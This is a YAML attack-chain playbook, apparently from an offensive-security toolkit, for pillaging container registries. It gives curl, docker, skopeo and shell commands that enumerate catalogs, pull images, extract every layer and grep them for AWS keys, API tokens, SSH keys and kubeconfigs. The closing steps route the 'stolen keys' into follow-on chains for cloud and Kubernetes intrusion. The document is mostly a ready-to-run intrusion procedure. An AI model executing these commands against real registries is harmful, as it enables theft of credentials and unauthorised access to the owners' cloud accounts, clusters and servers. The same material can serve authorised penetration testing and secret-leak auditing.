id: docker-registry-pillage
name: "Cloud / supply-chain — Docker registry pillage"
description: >
  Container registries (private Docker Hub, ECR, GCR, ACR, internal
  Harbor / Nexus) routinely hold images baked with hardcoded credentials,
  cloud keys, internal source code, and forgotten kubeconfigs. With
  registry creds (or sometimes anonymous access) → loot every layer.
tags: [cloud, docker, registry, supply-chain, post-exploitation]
difficulty: easy

inputs:
  - name: registry
    description: "Registry hostname (registry-1.docker.io, docker.pkg.github.com, ghcr.io, <org>.dkr.ecr.<region>.amazonaws.com)."
    required: true
  - name: image_name
    description: "Image to start with (e.g. myorg/internal-api). Find more with the catalog API."

steps:
  - id: enumerate_catalog
    name: "Enumerate the catalog (private registries)"
    inline_command: |
      # Docker Registry HTTP API v2:
      curl -u <user>:<password> https://<registry>/v2/_catalog
      # ECR (need AWS creds — see aws-imds-ssrf chain):
      aws ecr describe-repositories --region <region>
      # GHCR:
      gh api /user/packages?package_type=container
    inputs:
      registry: "${registry}"

  - id: list_tags
    name: "List tags for the target image"
    inline_command: |
      curl -u <user>:<password> 'https://<registry>/v2/<image>/tags/list'
    inputs:
      registry: "${registry}"
      image: "${image_name}"
    notes: |
      Look for tags like `latest`, `dev`, `staging`, `prod`, `v1.0.0`, and
      numbered tags like `:1234` (CI build numbers — these often leak more
      since they include build metadata layers).

  - id: pull_image
    name: "Pull the image without running it"
    inline_command: |
      docker login <registry>
      docker pull <registry>/<image>:<tag>
      # Or skip docker entirely with skopeo:
      skopeo copy docker://<registry>/<image>:<tag> dir:/tmp/image
    inputs:
      registry: "${registry}"
      image: "${image_name}"

  - id: inspect_history
    name: "Inspect image history (often contains plaintext secrets)"
    inline_command: |
      docker history --no-trunc <registry>/<image>:<tag>
      # Look for layers like:
      #   ENV AWS_ACCESS_KEY_ID=AKIAxxxx
      #   ENV DATABASE_PASSWORD=xxxx
      #   COPY ./.env /app/  (then later RUN rm /app/.env — old layer still has it)
    inputs:
      registry: "${registry}"
      image: "${image_name}"

  - id: extract_layers
    name: "Extract every layer's filesystem — grep for secrets"
    inline_command: |
      mkdir /tmp/extracted
      cd /tmp/extracted
      docker save <registry>/<image>:<tag> -o /tmp/img.tar
      tar xf /tmp/img.tar
      for layer in */layer.tar; do
        mkdir -p $(dirname $layer)/_
        tar xf $layer -C $(dirname $layer)/_
      done
      # Grep across all layers:
      grep -r -E 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\-_]{35}|sk_live|password\s*=\s*[A-Za-z0-9]' --include='*' .
      # Find kubeconfigs, SSH keys, JWT secrets, .env files:
      find . -name 'config*' -path '*kube*' -o -name 'id_rsa*' -o -name '.env*' -o -name 'secrets.yaml'
    inputs:
      registry: "${registry}"
      image: "${image_name}"
    notes: |
      Tools that automate this: trufflehog, gitleaks, deepfence/SecretScanner,
      anchore/syft (for SBOM). Run all of them — each catches different
      patterns.

  - id: anonymous_pull_check
    name: "Some registries allow anonymous pull (try without creds)"
    inline_command: |
      curl 'https://<registry>/v2/'
      # HTTP 200 → anonymous pull allowed
      # HTTP 401 → auth required; check WWW-Authenticate for the realm
      curl 'https://<registry>/v2/<image>/manifests/latest'
    inputs:
      registry: "${registry}"
      image: "${image_name}"
    notes: |
      Especially common with GitHub Container Registry (public packages),
      gcr.io public images, and mis-configured internal Harbor instances.

  - id: leverage_loot
    name: "Use the extracted secrets — cascade"
    inline_command: "echo 'AWS keys → aws-imds-ssrf next chain (with stolen keys instead of IMDS).\\nKubeconfig → kubernetes-pod-escape.\\nSSH keys → straight to SSH; check known hosts for targets.'"

references:
  - title: "Trufflehog (secret scanner)"
    url:   "https://github.com/trufflesecurity/trufflehog"
  - title: "Docker Registry HTTP API v2"
    url:   "https://distribution.github.io/distribution/spec/api/"

next_chains:
  - chain: kubernetes-pod-escape
    when:   'kubeconfig extracted'
    reason: 'Now you can hit the cluster API directly.'
  - chain: aws-imds-ssrf
    when:   'AWS keys extracted'
    reason: 'Skip the SSRF dance — already have creds for the API.'
